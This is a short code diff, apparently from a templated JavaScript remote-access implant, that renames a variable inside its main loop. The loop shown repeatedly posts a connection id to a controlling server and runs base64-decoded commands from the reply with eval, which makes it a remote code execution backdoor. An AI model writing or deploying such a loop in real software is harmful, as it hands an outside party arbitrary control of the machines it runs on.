@@ -41,10 +41,10 @@ function base64_decode(data) {
 }
 
 while(true){
-  resp = {{functions['post_req'][0]}}('{"connection_id":"'+{{connection_id[0]}}+'"}');
-  var start = resp.search('{')
-  var end = resp.search('}')
-  json_data = "{" + resp.substring(start+1, end) + "}"
+  response = {{functions['post_req'][0]}}('{"connection_id":"'+{{connection_id[0]}}+'"}');
+  var start = response.search('{')
+  var end = response.search('}')
+  json_data = "{" + response.substring(start+1, end) + "}"
   eval("command = " + json_data)
   if(command.eval){
     eval(base64_decode(command.eval));
